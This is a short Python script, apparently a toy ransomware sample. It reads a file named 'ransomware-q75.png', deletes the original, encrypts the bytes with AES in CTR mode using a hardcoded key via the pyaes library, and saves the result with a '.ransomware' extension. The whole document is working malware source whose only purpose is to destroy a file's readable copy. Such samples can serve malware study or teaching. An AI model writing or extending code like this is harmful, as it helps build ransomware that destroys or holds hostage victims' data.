import os
import pyaes

file_name = "ransomware-q75.png"
file = open(file_name, "rb")
file_data = file.read()
file.close()

os.remove(file_name)

key = b"0143256879fravtr"
aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomware"
new_file = open(new_file, "wb")
new_file.write(crypto_data)
new_file.close()